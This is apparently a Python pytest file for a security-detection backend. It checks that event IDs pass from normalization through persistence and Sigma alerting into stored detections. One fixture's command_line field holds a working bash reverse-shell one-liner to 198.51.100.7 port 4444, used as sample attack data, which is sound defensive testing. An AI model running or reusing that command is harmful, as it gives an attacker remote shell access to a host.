"""A detection names the event that caused it.

The normalizer pipeline assigns an event ID before publishing to
``mxtac.normalized``.  The event persister stores the event under that ID and
the Sigma consumer hands it to the alert manager, which writes it to
``detections.event_id``.

Coverage:
  - pipeline: every normalized message carries a new UUID under EVENT_ID_KEY,
    next to an unchanged OCSF payload
  - persister: the row and the OpenSearch document use that ID; a message
    without one (older producer) still gets an ID
  - Sigma consumer: the alert carries the event's ID (None without one)
  - alert manager: the ID is published and stored on the detection
"""

from __future__ import annotations

import re
from datetime import datetime, timezone
from unittest.mock import AsyncMock, MagicMock, patch

from app.engine.sigma_engine import SigmaAlert, SigmaEngine
from app.pipeline.queue import InMemoryQueue, Topic
from app.services.alert_manager import AlertManager
from app.services.event_persister import event_persister
from app.services.normalizers.ocsf import EVENT_ID_KEY, OCSFEvent
from app.services.normalizers.pipeline import NormalizerPipeline
from app.services.sigma_consumer import sigma_consumer

UUID_RE = re.compile(r"^[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$")
EVENT_ID = "3f6c1a52-7a0e-4c53-9d8b-0c1d2e3f4a5b"

WEBHOOK_EVENT = {
    "host": "app02",
    "user": "www-data",
    "command_line": "bash -c 'bash -i >& /dev/tcp/198.51.100.7/4444 0>&1'",
    "_webhook_source": "custom-source",
}


class _Capture:
    """Queue stand-in that records what is published."""

    def __init__(self) -> None:
        self.published: list[tuple[str, dict]] = []

    async def publish(self, topic: str, message: dict) -> None:
        self.published.append((topic, message))

    def on(self, topic: str) -> list[dict]:
        return [message for t, message in self.published if t == topic]


def _session() -> AsyncMock:
    session = AsyncMock()
    session.__aenter__ = AsyncMock(return_value=session)
    session.__aexit__ = AsyncMock(return_value=False)
    return session


# ── Normalizer pipeline ──────────────────────────────────────────────────────


async def test_pipeline_publishes_a_new_event_id_with_every_event() -> None:
    queue = _Capture()
    pipeline = NormalizerPipeline(queue)

    await pipeline._handle_webhook(dict(WEBHOOK_EVENT))
    await pipeline._handle_webhook(dict(WEBHOOK_EVENT))

    first, second = queue.on(Topic.NORMALIZED)
    assert UUID_RE.match(first[EVENT_ID_KEY])
    assert UUID_RE.match(second[EVENT_ID_KEY])
    assert first[EVENT_ID_KEY] != second[EVENT_ID_KEY]


async def test_pipeline_event_id_sits_next_to_an_unchanged_ocsf_payload() -> None:
    queue = _Capture()
    await NormalizerPipeline(queue)._handle_webhook(dict(WEBHOOK_EVENT))

    (message,) = queue.on(Topic.NORMALIZED)
    payload = {k: v for k, v in message.items() if k != EVENT_ID_KEY}
    assert set(payload) == set(OCSFEvent.model_fields)
    # The extra key is ignored when the message is read back as an OCSF event
    assert OCSFEvent(**message).model_dump(mode="json") == payload


async def test_every_source_gets_an_event_id() -> None:
    queue = _Capture()
    pipeline = NormalizerPipeline(queue)
    event = OCSFEvent(
        class_uid=1007, class_name="Process Activity", category_uid=1, metadata_product="X"
    )

    for name in ("_wazuh", "_zeek", "_suricata", "_syslog", "_webhook"):
        getattr(pipeline, name).normalize = MagicMock(return_value=event)
        await getattr(pipeline, f"_handle{name}")({})

    messages = queue.on(Topic.NORMALIZED)
    assert len(messages) == 5
    assert len({m[EVENT_ID_KEY] for m in messages}) == 5


# ── Event persister ──────────────────────────────────────────────────────────


async def _persist(message: dict, *, opensearch: MagicMock, create: AsyncMock) -> None:
    queue = InMemoryQueue()
    await queue.start()
    with (
        patch("app.services.event_persister.AsyncSessionLocal", return_value=_session()),
        patch("app.services.event_persister.EventRepo") as repo,
    ):
        repo.create = create
        await event_persister(queue, opensearch)
        await queue.publish(Topic.NORMALIZED, message)
        await queue.drain(timeout=5)
    await queue.stop()


def _normalized(**extra: str) -> dict:
    event = OCSFEvent(
        class_uid=1007, class_name="Process Activity", category_uid=1, metadata_product="Webhook"
    )
    return {**event.model_dump(mode="json"), **extra}


async def test_persister_stores_the_event_under_the_assigned_id() -> None:
    create = AsyncMock(side_effect=RuntimeError("stop after create"))

    await _persist(
        _normalized(**{EVENT_ID_KEY: EVENT_ID}),
        opensearch=MagicMock(is_available=False),
        create=create,
    )

    kwargs = create.await_args.kwargs
    assert kwargs["id"] == EVENT_ID
    assert EVENT_ID_KEY not in kwargs["raw"]


async def test_persister_indexes_under_the_assigned_id_even_when_postgresql_fails() -> None:
    opensearch = AsyncMock()
    opensearch.is_available = True

    await _persist(
        _normalized(**{EVENT_ID_KEY: EVENT_ID}),
        opensearch=opensearch,
        create=AsyncMock(side_effect=RuntimeError("database down")),
    )

    assert opensearch.index_event.await_args.kwargs == {"doc_id": EVENT_ID}
    assert opensearch.index_event.await_args.args[0]["id"] == EVENT_ID


async def test_persister_generates_an_id_for_a_message_without_one() -> None:
    create = AsyncMock(side_effect=RuntimeError("stop after create"))

    await _persist(_normalized(), opensearch=MagicMock(is_available=False), create=create)

    assert UUID_RE.match(create.await_args.kwargs["id"])


# ── Sigma consumer ───────────────────────────────────────────────────────────


class _MatchEverything(SigmaEngine):
    """Engine that raises one alert for every event."""

    async def evaluate(self, event: OCSFEvent):  # type: ignore[override]
        yield SigmaAlert(rule_id="rule-1", rule_title="Rule", host="app02")


async def _alerts_for(message: dict) -> list[dict]:
    queue = InMemoryQueue()
    await queue.start()
    alerts: list[dict] = []

    async def collect(alert: dict) -> None:
        alerts.append(alert)

    await queue.subscribe(Topic.ALERTS, "test", collect)
    await sigma_consumer(queue, _MatchEverything())
    await queue.publish(Topic.NORMALIZED, message)
    await queue.drain(timeout=5)
    await queue.stop()
    return alerts


async def test_sigma_alert_carries_the_event_id() -> None:
    (alert,) = await _alerts_for(_normalized(**{EVENT_ID_KEY: EVENT_ID}))

    assert alert["event_id"] == EVENT_ID


async def test_sigma_alert_without_an_event_id_has_none() -> None:
    (alert,) = await _alerts_for(_normalized())

    assert alert["event_id"] is None


def test_sigma_alert_event_id_defaults_to_none() -> None:
    assert SigmaAlert().event_id is None


# ── Alert manager ────────────────────────────────────────────────────────────


def _alert(**extra: str) -> dict:
    return {
        "id": "8a1f0f0e-2f4b-4a51-9b9d-1b1c8f4f7c55",
        "rule_id": "7d0c5a0e-52c7-4c0e-9d0a-6f1f3a2b9c11",
        "rule_title": "Interactive Bash Reverse Shell",
        "level": "high",
        "severity_id": 4,
        "technique_ids": ["T1059.004"],
        "tactic_ids": ["TA0002"],
        "host": "app02",
        "time": datetime.now(timezone.utc).isoformat(),
        "event_snapshot": {},
        **extra,
    }


async def _process(alert: dict) -> tuple[dict, dict]:
    """Run the alert manager; return (published alert, DetectionRepo.create kwargs)."""
    queue = _Capture()
    with patch("app.services.alert_manager.aioredis") as valkey:
        valkey.from_url.return_value = AsyncMock(set=AsyncMock(return_value=True))
        manager = AlertManager(queue)
    with (
        patch.object(manager, "_get_recurrence_count", new=AsyncMock(return_value=0)),
        patch.object(manager, "_correlate_incident", new=AsyncMock()),
        patch("app.core.database.AsyncSessionLocal", return_value=_session()),
        patch("app.repositories.detection_repo.DetectionRepo.create", new=AsyncMock()) as create,
    ):
        await manager.process(alert)
    (published,) = queue.on(Topic.ENRICHED)
    return published, create.await_args.kwargs


async def test_alert_manager_stores_the_event_id_on_the_detection() -> None:
    published, stored = await _process(_alert(event_id=EVENT_ID))

    assert published["event_id"] == EVENT_ID
    assert stored["event_id"] == EVENT_ID


async def test_alert_manager_stores_no_event_id_when_the_alert_has_none() -> None:
    published, stored = await _process(_alert())

    assert published["event_id"] is None
    assert stored["event_id"] is None
